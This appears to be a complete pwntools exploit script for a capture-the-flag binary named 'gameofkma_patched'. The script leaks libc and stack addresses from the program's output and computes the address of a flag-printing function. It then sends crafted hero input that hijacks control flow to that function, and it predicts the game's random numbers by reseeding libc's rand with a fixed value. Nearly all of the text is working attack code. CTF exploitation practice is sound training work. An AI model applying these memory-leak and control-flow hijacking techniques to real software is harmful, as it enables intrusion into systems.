#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
exe = ELF("gameofkma_patched")
libc = CDLL("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process(exe.path)
# context.terminal = ["foot"]
#
# gdb.attach(p, gdbscript='''
#            # b*0x555555556256 
#            # b*0x18d5 +0x555555554000 
#            # b*0x1946 + 0x555555554000
#            # b*0x55555555594e
#            # b*0x2305  + 0x555555554000
#            b*0x55555555632d
#
# ''')
#
def create_hero(a,addr,stack):
    p.sendlineafter(b'hero do you want?(0-2)',str(a))
    p.sendafter(b' your hero?',p8(0x12) + b'\0'*3 +p64(stack)+p32(addr &0xffffffff))
    p.sendafter(b' your hero?',p64(0x12) + b'a'*4 + p16(addr >>32))
def random():
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    libc.srand(0x1337)
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))



def main():
    p.sendlineafter(b' want?(0-5)\n',b'2')
    p.sendlineafter(b'do you want?(0-2)',b'1')
    p.recv(2)
    leak_libc = u64(p.recv(6)+b'\0\0')
    log.info('leak_libc: ' + hex(leak_libc))
    p.recv(9)
    leak_stack = int(b'0x'+p.recv(12),16)
    thing = leak_stack -328
    log.info('leak_stack: ' + hex(leak_stack))
    base = leak_libc - 0x1e8a
    log.info('base: ' + hex(base))
    flag_print = base + 0x1d6d +8  
    log.info('flag_print: ' + hex(flag_print))
    log.info(f'thing: ' + hex(thing))
    twobytes = flag_print & 0xffff
    create_hero(2,flag_print,leak_stack-0x20380)
    random()

    p.interactive()


if __name__ == "__main__":
    main()
